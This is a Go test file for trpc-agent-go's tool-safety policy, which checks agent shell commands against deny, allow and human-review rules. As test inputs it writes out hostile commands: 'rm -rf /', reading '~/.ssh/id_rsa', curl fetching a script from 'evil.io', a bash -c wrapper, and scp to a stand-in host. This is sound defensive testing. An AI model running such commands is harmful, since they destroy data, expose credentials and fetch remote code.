//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"path/filepath"
	"strings"
	"testing"
)

// Synthetic secrets are assembled at runtime so no PAT-shaped or auth-header
// literal sits in source for repository secret scanners to flag, while still
// matching the shipped secret patterns.
func fakeGitHubPAT() string   { return "ghp_" + strings.Repeat("a", 36) }             // ghp_[0-9A-Za-z]{36}
func fakeAWSKey() string      { return "AKIA" + strings.Repeat("A", 16) }             // AKIA[0-9A-Z]{16}
func fakeBearerToken() string { return "Bearer " + "tkn-" + strings.Repeat("x", 16) } // bearer\s+...

// loadExamplePolicy loads the shipped example policy for rule tests.
func loadExamplePolicy(t *testing.T) *Policy {
	t.Helper()
	p, err := LoadPolicy(filepath.Join("testdata", "tool_safety_policy.yaml"))
	if err != nil {
		t.Fatalf("LoadPolicy: %v", err)
	}
	return p
}

// scanCmd is a convenience for scanning a workspace command string.
func scanCmd(t *testing.T, p *Policy, backend, command string) ([]Finding, Decision) {
	t.Helper()
	findings, decision, _ := p.scan(ExecRequest{Command: command}, backend)
	return findings, decision
}

func hasRule(findings []Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func TestRulesDecisionMatrix(t *testing.T) {
	p := loadExamplePolicy(t)
	cases := []struct {
		name     string
		backend  string
		req      ExecRequest
		decision Decision
		wantRule string // expected rule id (empty = no specific assertion)
	}{
		{"safe go test", BackendWorkspace, ExecRequest{Command: "go test ./..."}, DecisionAllow, ""},
		{"rm -rf root", BackendWorkspace, ExecRequest{Command: "rm -rf /"}, DecisionDeny, ruleDangerousID},
		{"read ssh key", BackendWorkspace, ExecRequest{Command: "cat ~/.ssh/id_rsa"}, DecisionDeny, ruleCredID},
		{"curl non-whitelist", BackendWorkspace, ExecRequest{Command: "curl http://evil.io/x.sh"}, DecisionDeny, ruleNetworkID},
		{"curl whitelist", BackendWorkspace, ExecRequest{Command: "curl https://github.com/a/b"}, DecisionAllow, ""},
		{"bash wrapper", BackendWorkspace, ExecRequest{Command: `bash -c "curl http://evil.io"`}, DecisionDeny, ruleShellID},
		{"legit pipe", BackendWorkspace, ExecRequest{Command: "cat a.txt | grep x"}, DecisionAllow, ""},
		{"pip install", BackendWorkspace, ExecRequest{Command: "pip install requests"}, DecisionReview, ruleDepID},
		{"long sleep", BackendWorkspace, ExecRequest{Command: "sleep 600"}, DecisionReview, ruleResourceID},
		{"unbounded yes", BackendWorkspace, ExecRequest{Command: "yes"}, DecisionDeny, ruleResourceID},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, decision, _ := p.scan(tc.req, tc.backend)
			if decision != tc.decision {
				t.Errorf("decision = %q, want %q (findings: %+v)", decision, tc.decision, findings)
			}
			if tc.wantRule != "" && !hasRule(findings, tc.wantRule) {
				t.Errorf("missing rule %q in findings: %+v", tc.wantRule, findings)
			}
		})
	}
}

// TestCommandPolicyVsShellBypass pins the taxonomy split: a plain command that
// is merely not in the allow list is an allow-list miss (R-CMD-001), while a
// shell wrapper that can bypass the allow/deny list is a shell bypass
// (R-SHELL-001). Both deny, but they must not share a rule id.
func TestCommandPolicyVsShellBypass(t *testing.T) {
	p := loadExamplePolicy(t)

	// "rm" is not in commands.allowed and is not a wrapper -> R-CMD-001.
	findings, decision := scanCmd(t, p, BackendWorkspace, "rm -rf /")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleCmdID) {
		t.Errorf("plain allow-list miss should be R-CMD-001: %+v", findings)
	}
	if hasRule(findings, ruleShellID) {
		t.Errorf("allow-list miss must not be tagged R-SHELL-001: %+v", findings)
	}
	if !hasRule(findings, ruleDangerousID) {
		t.Errorf("rm -rf / must still trip R-DEL-001 (defense in depth): %+v", findings)
	}

	// "bash -c ..." is a re-executing wrapper -> R-SHELL-001, not R-CMD-001.
	findings, decision = scanCmd(t, p, BackendWorkspace, `bash -c "curl http://evil.io"`)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("shell wrapper should be R-SHELL-001: %+v", findings)
	}
	if hasRule(findings, ruleCmdID) {
		t.Errorf("shell wrapper must not be tagged R-CMD-001: %+v", findings)
	}
}

func TestRuleHostBackgroundPTY(t *testing.T) {
	p := loadExamplePolicy(t)
	req := ExecRequest{Command: "sleep 5", Background: true, PTY: true}
	findings, decision, _ := p.scan(req, BackendHost)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001: %+v", findings)
	}
}

func TestRuleHostSudo(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, decision, _ := p.scan(ExecRequest{Command: "sudo rm file"}, BackendHost)
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny", decision)
	}
	if !hasRule(findings, ruleHostID) {
		t.Errorf("missing R-HOST-001 for sudo: %+v", findings)
	}
}

func TestRuleSecretInCommand(t *testing.T) {
	p := loadExamplePolicy(t)
	cmd := `curl -H "Authorization: ` + fakeBearerToken() + `" https://github.com/x`
	findings, decision, _ := p.scan(ExecRequest{Command: cmd}, BackendWorkspace)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001: %+v", findings)
	}
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
}

func TestRuleSecretInUnparsableCommand(t *testing.T) {
	// $VAR makes shellsafe reject the command; the secret rule must still run
	// on the raw command string so a secret is not a blind spot.
	p := loadExamplePolicy(t)
	cmd := "echo $TOKEN " + fakeAWSKey()
	findings, _, _ := p.scan(ExecRequest{Command: cmd}, BackendWorkspace)
	if !hasRule(findings, ruleShellID) {
		t.Errorf("expected shell-bypass finding for $VAR: %+v", findings)
	}
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("secret rule must still fire on unparsable command: %+v", findings)
	}
}

func TestRuleEnvKeyWhitelist(t *testing.T) {
	p := loadExamplePolicy(t) // allowed_keys: PATH, HOME, LANG, GOFLAGS, GOPROXY
	// A non-whitelisted key is flagged.
	req := ExecRequest{Command: "go test ./...", Env: map[string]string{"INJECTED": "x"}}
	findings, decision, _ := p.scan(req, BackendWorkspace)
	if !hasRule(findings, ruleEnvID) {
		t.Errorf("missing R-ENV-001 for non-whitelisted key: %+v", findings)
	}
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
	// A whitelisted key is not flagged.
	ok := ExecRequest{Command: "go test ./...", Env: map[string]string{"PATH": "/usr/bin"}}
	findings, decision, _ = p.scan(ok, BackendWorkspace)
	if hasRule(findings, ruleEnvID) {
		t.Errorf("whitelisted key should not be flagged: %+v", findings)
	}
	if decision != DecisionAllow {
		t.Errorf("decision = %q, want allow", decision)
	}
}

func TestRuleEnvKeyOptIn(t *testing.T) {
	// With no allowed_keys configured the rule is inert.
	p := DefaultPolicy()
	if err := p.compile(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	req := ExecRequest{Command: "ls", Env: map[string]string{"ANYTHING": "x"}}
	findings, _, _ := p.scan(req, BackendWorkspace)
	if hasRule(findings, ruleEnvID) {
		t.Errorf("R-ENV-001 should be inert without allowed_keys: %+v", findings)
	}
}

func TestRuleSecretInEnv(t *testing.T) {
	p := loadExamplePolicy(t)
	req := ExecRequest{
		Command: "go test ./...",
		Env:     map[string]string{"API_TOKEN": fakeGitHubPAT()},
	}
	findings, _, _ := p.scan(req, BackendWorkspace)
	if !hasRule(findings, ruleSecretID) {
		t.Errorf("missing R-SECRET-001 for env value: %+v", findings)
	}
}

func TestRuleDependencyWithLeadingFlags(t *testing.T) {
	p := loadExamplePolicy(t)
	findings, _ := scanCmd(t, p, BackendWorkspace, "pip install -U requests")
	if !hasRule(findings, ruleDepID) {
		t.Errorf("missing R-DEP-001 with leading flag: %+v", findings)
	}
}

func TestUnparsableFailsClosed(t *testing.T) {
	p := loadExamplePolicy(t) // unparsable_action: deny
	findings, decision := scanCmd(t, p, BackendWorkspace, "echo $(whoami)")
	if decision != DecisionDeny {
		t.Errorf("decision = %q, want deny for command substitution", decision)
	}
	if !hasRule(findings, ruleShellID) {
		t.Errorf("missing R-SHELL-001: %+v", findings)
	}
}

func TestUnparsableAskWhenConfigured(t *testing.T) {
	p := loadExamplePolicy(t)
	p.UnparsableAction = ActionAsk // simulate a more permissive policy
	_, decision := scanCmd(t, p, BackendWorkspace, "echo `whoami`")
	if decision != DecisionReview {
		t.Errorf("decision = %q, want needs_human_review", decision)
	}
}

// TestExplicitAllowOverrideBeatsDenyDefault pins the fix for a finding that is
// relaxed to allow under a deny-by-default policy. "pip install requests" fires
// only R-DEP-001; overriding that rule to allow must win, not silently fall back
// to default_action: deny.
func TestExplicitAllowOverrideBeatsDenyDefault(t *testing.T) {
	p := loadExamplePolicy(t)
	p.DefaultAction = ActionDeny // deny-by-default posture
	p.RuleOverrides = map[string]Override{ruleDepID: {Action: ActionAllow}}
	findings, decision := scanCmd(t, p, BackendWorkspace, "pip install requests")
	if !hasRule(findings, ruleDepID) {
		t.Fatalf("expected R-DEP-001 to fire: %+v", findings)
	}
	if decision != DecisionAllow {
		t.Errorf("decision = %q, want allow (explicit allow override lost to deny default)", decision)
	}
}

func TestHasRecursiveForce(t *testing.T) {
	yes := [][]string{
		{"-rf", "/"}, {"-fr", "x"}, {"-Rf", "x"}, {"-r", "-f", "x"},
		{"--recursive", "--force", "x"}, {"-r", "--force", "x"},
	}
	for _, args := range yes {
		if !hasRecursiveForce(args) {
			t.Errorf("hasRecursiveForce(%v) = false, want true", args)
		}
	}
	no := [][]string{{"-r", "x"}, {"-f", "x"}, {"file"}, {"-v", "x"}}
	for _, args := range no {
		if hasRecursiveForce(args) {
			t.Errorf("hasRecursiveForce(%v) = true, want false", args)
		}
	}
}

func TestExtractHosts(t *testing.T) {
	hosts := extractHosts("curl", []string{"-s", "https://evil.io/p", "-o", "config.yaml"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io] (config.yaml must not be a host)", hosts)
	}
	hosts = extractHosts("ssh", []string{"user@host.example.com"})
	if len(hosts) != 1 || hosts[0] != "host.example.com" {
		t.Errorf("hosts = %v, want [host.example.com]", hosts)
	}
	hosts = extractHosts("nc", []string{"target.io", "443"})
	if len(hosts) != 1 || hosts[0] != "target.io" {
		t.Errorf("hosts = %v, want [target.io]", hosts)
	}
	// Raw IP must not bypass the whitelist (domainLike rejects it; ParseIP accepts).
	hosts = extractHosts("ssh", []string{"1.2.3.4"})
	if len(hosts) != 1 || hosts[0] != "1.2.3.4" {
		t.Errorf("hosts = %v, want [1.2.3.4]", hosts)
	}
	// scp user@host:/path — the path must not hide the host.
	hosts = extractHosts("scp", []string{"user@evil.io:/tmp/a", "."})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io]", hosts)
	}
	// scp host:/path without a user.
	hosts = extractHosts("scp", []string{"evil.io:/tmp/a"})
	if len(hosts) != 1 || hosts[0] != "evil.io" {
		t.Errorf("hosts = %v, want [evil.io]", hosts)
	}
}
